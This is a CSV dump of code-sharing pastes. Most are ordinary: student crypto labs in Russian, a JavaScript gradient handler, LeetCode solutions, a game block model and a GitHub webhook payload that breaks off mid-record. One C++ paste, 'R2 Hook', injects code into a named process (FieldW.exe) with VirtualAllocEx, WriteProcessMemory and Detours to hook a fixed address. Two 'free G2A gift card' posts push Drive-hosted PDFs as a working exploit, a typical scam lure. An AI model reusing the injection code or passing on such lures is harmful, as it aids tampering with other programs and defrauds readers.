id,title,username,language,date,content
ZuNHfLGp,04. Mouse Gradient,drak138,JavaScript,Tuesday 28th of May 2024 12:56:57 PM CDT,"function attachGradientEvents() {
    //get html elements
    let gradientWrapper=document.getElementById('gradient');
    let result=document.getElementById('result')
    //add event listeners
    gradientWrapper.addEventListener('mousemove', action);
    gradientWrapper.addEventListener('mouseout', gradientOut);
    //call function
    function action(event){
        //get the box width
        let gradientWidth=event.currentTarget.offsetWidth;
        //get mouse position on gradient Box
        let positionOfTheMouse = event.offsetX / (gradientWidth - 1);
        //get percentage of the mouse X axis
        let percentage = Math.trunc(positionOfTheMouse * 100);
        
        result.textContent = percentage + ""%"";
    }
    //when mouse is outside of gradient Box make the result equal empty string
    function gradientOut() {
        result.textContent = """";
        }
}"
RXgT4KTg,R2 Hook,AkselRus,C++,Tuesday 28th of May 2024 12:52:31 PM CDT,"#include <windows.h>
#include <tlhelp32.h>
#include <detours.h>

// Адрес функции, которую будем перехватывать
#define TARGET_FUNCTION_ADDRESS 0x62019274

typedef unsigned long (__thiscall *Real_Check)(void *thisPtr);
Real_Check Original_Check = nullptr;

// Функция-хук
unsigned long __fastcall Hook_Check(void *thisPtr) {
    // Ваш код перехвата
    MessageBoxA(NULL, ""Функция перехвачена!"", ""Перехват"", MB_OK);
    return Original_Check(thisPtr);
}

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processEntry) == TRUE) {
        while (Process32Next(snapshot, &processEntry) == TRUE) {
            if (_stricmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}

void InjectAndHook(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        MessageBoxA(NULL, ""Не удалось открыть процесс"", ""Ошибка"", MB_OK);
        return;
    }

    // Аллоцирование памяти для кода хука
    LPVOID pHookCode = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pHookCode) {
        MessageBoxA(NULL, ""Не удалось аллоцировать память"", ""Ошибка"", MB_OK);
        CloseHandle(hProcess);
        return;
    }

    // Скопируем код хука в выделенную память
    SIZE_T written;
    WriteProcessMemory(hProcess, pHookCode, (LPCVOID)Hook_Check, 4096, &written);

    // Инициализация Detours и перехват функции
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    // Адрес оригинальной функции
    Original_Check = (Real_Check)TARGET_FUNCTION_ADDRESS;

    // Установка перехвата
    DetourAttach(&(PVOID&)Original_Check, (PVOID)pHookCode);

    DetourTransactionCommit();

    CloseHandle(hProcess);
}

int main() {
    const char* processName = ""FieldW.exe"";
    DWORD processId = GetProcessIdByName(processName);
    if (processId == 0) {
        MessageBoxA(NULL, ""Процесс не найден"", ""Ошибка"", MB_OK);
        return 1;
    }

    InjectAndHook(processId);

    return 0;
}
"
805fjTBx,lr_4_krypta,Teammasik,Python,Tuesday 28th of May 2024 12:41:37 PM CDT,"import random
import tkinter as tk
from tkinter import messagebox

# 23 13 16

def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def find_primitive_root(q):
    # Находим факторы
    if not is_prime(q):
        messagebox.showinfo(""Ошибка!"", f""Число q не простое!"")
        return None
    factors = prime_factors(q - 1)

    while True:
        a = random.randint(2, q - 1)
        if all(pow(a, (q - 1) // p, q) != 1 for p in factors):
            return a


def prime_factors(n):
    # Нахождение простых множителей числа.
    i = 2
    factors = []
    while i * i <= n:
        if n % i:
            i += 1
        else:
            n //= i
            factors.append(i)
    if n > 1:
        factors.append(n)
    return factors


def calculate_key(q, alpha, Xa, Xb):
    Ya = (alpha ** Xa) % q
    Yb = (alpha ** Xb) % q

    Ka = (Yb ** Xa) % q
    Kb = (Ya ** Xb) % q

    if Ka == Kb:
        return Ka
    else:
        return None


def calculate_key_button_click():
    try:
        q = int(q_entry.get())
        Xa = int(Xa_entry.get())
        Xb = int(Xb_entry.get())
        alpha = find_primitive_root(q)

        key = calculate_key(q, alpha, Xa, Xb)
        if key is not None:
            result_label.config(text=f""Ключ: {key}"")
        else:
            result_label.config(text=""Ошибка: ключи не совпадают."")
    except ValueError:
        messagebox.showerror(""Ошибка"", ""Введите корректные числовые значения."")


root = tk.Tk()
root.title(""Алгоритм Диффи-Хелмана"")

q_label = tk.Label(root, text=""Простое число q:"")
q_label.pack()
q_entry = tk.Entry(root)
q_entry.pack()

Xa_label = tk.Label(root, text=""Число Xa:"")
Xa_label.pack()
Xa_entry = tk.Entry(root)
Xa_entry.pack()

Xb_label = tk.Label(root, text=""Число Xb:"")
Xb_label.pack()
Xb_entry = tk.Entry(root)
Xb_entry.pack()


# Ya_label = tk.Label(root, text=""Число Xa:"") # TODO доделать 2 кнопки на передачу открытых значений чтобы можно
#                                             # было наебать
# Ya_label.pack()
# Ya_entry = tk.Entry(root)
# Ya_entry.pack()
# 
# Yb_label = tk.Label(root, text=""Число Xb:"")
# Yb_label.pack()
# Yb_entry = tk.Entry(root)
# Yb_entry.pack()

calculate_button = tk.Button(root, text=""Вычислить ключ"", command=calculate_key_button_click)
calculate_button.pack()

result_label = tk.Label(root, text="""")
result_label.pack()

root.mainloop()
"
eASzuFgC,laba_3_krypta,Teammasik,Python,Tuesday 28th of May 2024 12:41:12 PM CDT,"import tkinter as tk
from tkinter import messagebox
import random

abc = {chr(i): (ord(chr(i)) - ord('а') + 1) for i in range(ord('а'), ord('я') + 1)}


def calculate_n(p, q):
    return p * q


def calculate_phi(p, q):
    return (p - 1) * (q - 1)


def calculate_e(phi):
    g = 0
    e = 3
    while g != 1:
        e = random.randrange(1, phi)
        if is_prime(e):
            g = gcd(e, phi)
    return e


def calculate_e_v2(phi_n):
    while True:
        e = random.randint(2, phi_n)
        if gcd(e, phi_n) == 1:
            return e


def calculate_d(e, phi):
    d = 0
    while (e * d) % phi != 1:
        d += 1
    return d


def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


def get_key(d, value):
    for k, v in d.items():
        if v == value:
            return k


def encrypt(e, n, plaintext):
    ciphertext = [(abc[char] ** e) % n for char in plaintext]
    text = [abc[char] for char in plaintext]
    print(text)
    return ciphertext


def decrypt(private_key, ciphertext):
    p, q, phi, d = private_key
    n = p * q
    plaintext = []

    for i in ciphertext:
        print(i, (i ** d) % n, get_key(abc, ((i ** d) % n)))

    for num in ciphertext:
        plaintext.append(get_key(abc, ((num ** d) % n)))
    return ''.join(plaintext)


def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x


def solve_comparison_equation(a, n):
    b = 1
    g, x0, _ = extended_gcd(a, n)

    if b % g != 0:
        return -1
    else:
        x0 = (x0 * (b // g)) % n
        return x0


def create_keys():
    p = int(entry_p.get(""1.0"", tk.END))
    q = int(entry_q.get(""1.0"", tk.END))

    n = calculate_n(p, q)
    phi = calculate_phi(p, q)
    e = calculate_e(phi)
    # d = solve_comparison_equation(e, phi)
    d = calculate_d(e, phi)

    global open_keys, closed_keys
    open_keys = [n, e]
    closed_keys = [p, q, phi, d]
    messagebox.showinfo(""Результат дешифрования"", f""Расшифрованный текст: {open_keys, closed_keys}"")


def encrypt_message():
    plaintext = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    entry_plaintext.delete('1.0', tk.END)
    e = open_keys[1]
    n = open_keys[0]

    ciphertext = encrypt(e, n, plaintext)
    text_area.delete('1.0', tk.END)
    text_area.insert('1.0', ','.join(map(str, ciphertext)))
    messagebox.showinfo(""Результат шифрования"", f""Зашифрованный текст: {ciphertext}"")


def decrypt_message():
    ciphertext = [int(char) for char in text_area.get('1.0', tk.END).split(',')]
    plaintext = decrypt(closed_keys, ciphertext)
    messagebox.showinfo(""Результат дешифрования"", f""Расшифрованный текст: {plaintext}"")


root = tk.Tk()
root.title(""Алгоритм RSA"")

closed_keys = []  # p, q, phi, d
open_keys = []  # e,n


frame_keys = tk.Frame(root)
frame_keys.pack(pady=10)

button_create_keys = tk.Button(frame_keys, text=""Создать ключи"", command=create_keys)  # todo
button_create_keys.pack()

frame_encrypted_text = tk.Frame(root)
frame_encrypted_text.pack(pady=10)

label_encrypted_text = tk.Label(frame_encrypted_text, text=""зашифрованное сообщение:"")
label_encrypted_text.pack(side=tk.LEFT)

text_area = tk.Text(frame_encrypted_text, height=2, width=15)
text_area.pack(side=tk.LEFT)

button_decrypt = tk.Button(frame_encrypted_text, text=""Расшифровать"", command=decrypt_message)
button_decrypt.pack(side=tk.RIGHT)

frame_encrypt = tk.Frame(root)
frame_encrypt.pack(pady=10)

label_p = tk.Label(frame_encrypt, text=""p:"")
label_p.pack(side=tk.LEFT)

entry_p = tk.Text(frame_encrypt, height=1, width=15)
entry_p.pack(side=tk.LEFT)

label_q = tk.Label(frame_encrypt, text=""q:"")
label_q.pack(side=tk.LEFT)

entry_q = tk.Text(frame_encrypt, height=1, width=15)
entry_q.pack(side=tk.LEFT)

label_plaintext = tk.Label(frame_encrypt, text=""Текст:"")
label_plaintext.pack(side=tk.LEFT)

entry_plaintext = tk.Text(frame_encrypt, height=1, width=15)
entry_plaintext.pack(side=tk.LEFT)

button_encrypt = tk.Button(frame_encrypt, text=""Зашифровать"", command=encrypt_message)
button_encrypt.pack(side=tk.LEFT)

root.mainloop()
"
XjbCu5VQ,cypher,b_gandurov,C#,Tuesday 28th of May 2024 12:38:22 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

class Program
{
    static Dictionary<string, char> cipherMap;
    static List<string> results;

    static void Main()
    {
        string secretCode = Console.ReadLine();
        string cipher = Console.ReadLine();

        cipherMap = ParseCipher(cipher);
        results = new List<string>();

        FindMesssage(secretCode, 0, """");

        Console.WriteLine(results.Count);
        foreach (var message in results.OrderBy(m => m))
        {
            Console.WriteLine(message);
        }
    }

    static Dictionary<string, char> ParseCipher(string cipher)
    {
        Dictionary<string, char> map = new Dictionary<string, char>();
        int i = 0;
        while (i < cipher.Length)
        {
            char letter = cipher[i];
            i++;
            string digits = """";
            while (i < cipher.Length && char.IsDigit(cipher[i]))
            {
                digits += cipher[i];
                i++;
            }
            map[digits] = letter;
        }
        return map;
    }

    static void FindMesssage(string secretCode, int index, string currentMessage)
    {
        if (index == secretCode.Length)
        {
            results.Add(currentMessage);
            return;
        }

        for (int len = 1; len <= secretCode.Length - index; len++)
        {
            string key = secretCode.Substring(index, len);
            if (cipherMap.ContainsKey(key))
            {
                FindMesssage(secretCode, index + len, currentMessage + cipherMap[key]);
            }
        }

    }
}"
zbD4EpFi,Evaluate Division,jayati,C++,Tuesday 28th of May 2024 12:07:12 PM CDT,"class Solution {
public:
    double dfs(string src,string dst,unordered_map<string,vector<pair<string,double>>> adjlist,set<string> vis)
    {

        if(vis.find(src)!=vis.end())
        {
             return -1.0;
        }
        if(src==dst)
        {
            return 1.0;
        }
        vis.insert(src);
        for(auto u:adjlist[src])
        {
           
            double tmp=dfs(u.first,dst,adjlist,vis);
            if(tmp!=-1.0)
            {
                return tmp*(u.second);
            }
        }
        return -1.0;
    }
    vector<double> calcEquation(vector<vector<string>>& equations, vector<double>& values, vector<vector<string>>& queries) {
        unordered_map<string,vector<pair<string,double>>> adjlist;
        set<string> node;

        for(int i=0;i<equations.size();i++)
        {
            auto u = equations[i];
            adjlist[u[0]].push_back({u[1],values[i]});
            adjlist[u[1]].push_back({u[0],(double)(1/values[i])});

            node.insert(u[0]);
            node.insert(u[1]);
        }
        vector<double> ans;
        for(auto q:queries)
        {
            set<string> vis;
            if(node.find(q[0])==node.end() || node.find(q[1])==node.end())
            {
                ans.push_back(-1);
            }
            else
            {
                ans.push_back(dfs(q[0],q[1],adjlist,vis));
            }
        }
        return ans;
    }
};"
Er85GFMf,Untitled,MeehoweCK,C++,Tuesday 28th of May 2024 12:07:04 PM CDT,"#include <iostream>

int main() {
	auto a{ 5 };
	++a;		// operator preinkrementacji (zwiększenie wartości a o 1)
	std::cout << a << std::endl;		// 6
	a++;		// operator postinkrementacji
	std::cout << a << std::endl;		// 7

	auto b{ 13 };
	--b;		// operator predekremantacji (zmniejszenie wartości b o 1)
	std::cout << b << std::endl;		// 12
	b--;		// operator postdekrementacji
	std::cout << b << std::endl;		// 11

	return 0;
}"
ZdzbRPG6,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Tuesday 28th of May 2024 12:05:32 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
28 May 2024"
s83frQ0X,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Tuesday 28th of May 2024 12:04:07 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_792251.pdf

Working as of:
28 May 2024"
3057jSv6,Untitled,Ilya_Bykonya,C++,Tuesday 28th of May 2024 11:56:56 AM CDT,"
std::vector<int> permutation_positions(const std::string& s1, const std::string& s2) {
    if(s1.length() < s2.length())
        return {};

    std::map<char, int64_t> letters{};
    for(auto letter: s2) { ++letters[letter]; }
    for(size_t index = 0; index < s2.length(); ++index) {
        --letters[s1[index]];
    }

    std::vector<int> results{};
    for(size_t index = 0; index < (s1.length() - s2.length()); ++index) {
        std::cout << letters << std::endl;
        if(std::all_of(letters.begin(), letters.end(), [](const auto& pair) { return pair.second == 0; })) {
            results.push_back(index);
        }

        --letters[s1[index + s2.length()]];
        ++letters[s1[index]];
    }
    if(std::all_of(letters.begin(), letters.end(), [](const auto& pair) { return pair.second == 0; })) {
        results.push_back(s1.length() - s2.length());
    }

    return results;
}
"
QzJzRuAt,grass_stairs.rhai,fisharmy100,Rust,Tuesday 28th of May 2024 11:35:45 AM CDT,"fn name() { ""grass_stairs"" }
fn display_name() { ""Grass Stairs"" }
fn visibility() { ""transparent"" }
fn model()
{
    let textures = [
        tex_ref(uvec2(0, 0), uvec2(16, 16), ""block_game_tileset.png""), // dirt
        tex_ref(uvec2(48, 0), uvec2(16, 16), ""block_game_tileset.png""), // grass edge
        tex_ref(uvec2(32, 0), uvec2(16, 16), ""block_game_tileset.png""), // grass
    ];

    let vertices = [
        // Upper top face
        vertex(vec3(0.0, 1.0, 0.0), uvec2(0, 0), 2),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(16, 0), 2),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(0, 8), 2),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(16, 8), 2),

        // Bottom face
        vertex(vec3(0.0, 0.0, 0.0), uvec2(0, 0), 0),
        vertex(vec3(1.0, 0.0, 0.0), uvec2(16, 0), 0),
        vertex(vec3(0.0, 0.0, 1.0), uvec2(0, 16), 0),
        vertex(vec3(1.0, 0.0, 1.0), uvec2(16, 16), 0),

        // North Face
        vertex(vec3(1.0, 0.0, 0.0), uvec2(0, 16), 1),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(0, 0), 1),
        vertex(vec3(0.0, 1.0, 0.0), uvec2(16, 0), 1),
        vertex(vec3(0.0, 0.0, 0.0), uvec2(16, 16), 1),

        // Lower South face
        vertex(vec3(0.0, 0.0, 1.0), uvec2(0, 8), 1),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(0, 0), 1),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(16, 0), 1),
        vertex(vec3(1.0, 0.0, 1.0), uvec2(16, 8), 1),

        // Lower top face
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 0), 2),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(16, 0), 2),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(0, 8), 2),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(16, 8), 2),

        // Upper South Face
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 8), 1),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(0, 0), 1),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(16, 0), 1),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(16, 8), 1),

        // Short east face
        vertex(vec3(1.0, 0.0, 1.0), uvec2(0, 8), 1),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(0, 0), 1),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(8, 0), 1),
        vertex(vec3(1.0, 0.0, 0.5), uvec2(8, 8), 1),

        // Tall east face
        vertex(vec3(1.0, 0.0, 0.5), uvec2(0, 16), 1),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(0, 0), 1),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(8, 0), 1),
        vertex(vec3(1.0, 0.0, 0.0), uvec2(8, 16), 1),

        // Short west face
        vertex(vec3(0.0, 0.0, 0.5), uvec2(0, 8), 1),
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 0), 1),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(8, 0), 1),
        vertex(vec3(0.0, 0.0, 1.0), uvec2(8, 8), 1),

        // Tall west face
        vertex(vec3(0.0, 0.0, 0.0), uvec2(0, 16), 1),
        vertex(vec3(0.0, 1.0, 0.0), uvec2(0, 0), 1),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(8, 0), 1),
        vertex(vec3(0.0, 0.0, 0.5), uvec2(8, 16), 1),
    ];

    let indices = [
        // Top face
        2, 1, 0, 2, 3, 1,

        // Bottom face
        4, 5, 6, 5, 7, 6,

        // North face
        10, 9, 8, 10, 8, 11,

        // Lower South face
        14, 13, 12, 14, 12, 15,

        // Lower Top face
        18, 17, 16, 18, 19, 17,

        // Upper South face
        22, 21, 20, 22, 20, 23,

        // Short east face
        26, 25, 24, 26, 24, 27,

        // Tall east face
        30, 29, 28, 30, 28, 31,

        // Short west face
        34, 33, 32, 34, 32, 35,

        // Tall west face
        38, 37, 36, 38, 36, 39,
    ];

    mesh(vertices, indices, textures)
}"
e2Cs5WeT,Untitled,Ilya_Bykonya,C++,Tuesday 28th of May 2024 11:34:46 AM CDT,"bool is_permutation(const std::string& s1, const std::string& s2) {
    std::map<char, int64_t> letters{};
    for(auto letter: s1)
        ++letters[letter];
    for(auto letter: s2)
        --letters[letter];
    return std::all_of(letters.begin(), letters.end(), [](const auto& pair) {
        return pair.second == 0;
    });
}
"
EnpRH3xM,Github Pull Request Payload,wesdrum,JSON,Tuesday 28th of May 2024 11:15:45 AM CDT,"{
  ""action"": ""closed"",
  ""number"": 799,
  ""pull_request"": {
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799"",
    ""id"": 1890570845,
    ""node_id"": ""PR_kwDOEcz4_s5wr9Jd"",
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799"",
    ""diff_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799.diff"",
    ""patch_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799.patch"",
    ""issue_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799"",
    ""number"": 799,
    ""state"": ""closed"",
    ""locked"": false,
    ""title"": ""ajustes visuais  portal `HetoBank`"",
    ""user"": {
      ""login"": ""LuanNascimento-Hetosoft"",
      ""id"": 126170160,
      ""node_id"": ""U_kgDOB4U0MA"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/126170160?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/LuanNascimento-Hetosoft"",
      ""html_url"": ""https://github.com/LuanNascimento-Hetosoft"",
      ""followers_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/followers"",
      ""following_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/orgs"",
      ""repos_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/repos"",
      ""events_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""body"": null,
    ""created_at"": ""2024-05-27T17:50:42Z"",
    ""updated_at"": ""2024-05-28T14:47:00Z"",
    ""closed_at"": ""2024-05-28T14:47:00Z"",
    ""merged_at"": ""2024-05-28T14:47:00Z"",
    ""merge_commit_sha"": ""89d3cd7eb6809afc2c8878e8d597cf9f5d0ee5b3"",
    ""assignee"": null,
    ""assignees"": [

    ],
    ""requested_reviewers"": [

    ],
    ""requested_teams"": [

    ],
    ""labels"": [

    ],
    ""milestone"": null,
    ""draft"": false,
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/commits"",
    ""review_comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/comments"",
    ""review_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/comments{/number}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799/comments"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887"",
    ""head"": {
      ""label"": ""hetosoft:796-194442-solnet_web_hetobankalterar-label-de-botoes-e-nao-esta-replicando-configuracao"",
      ""ref"": ""796-194442-solnet_web_hetobankalterar-label-de-botoes-e-nao-esta-replicando-configuracao"",
      ""sha"": ""9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 298645758,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
        ""name"": ""ProjetosSol.WEB"",
        ""full_name"": ""hetosoft/ProjetosSol.WEB"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""description"": ""Projetos Hetosoft .NET"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
        ""created_at"": ""2020-09-25T18:04:07Z"",
        ""updated_at"": ""2024-05-28T13:06:46Z"",
        ""pushed_at"": ""2024-05-28T14:44:55Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""homepage"": null,
        ""size"": 621172,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""C#"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 15,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 15,
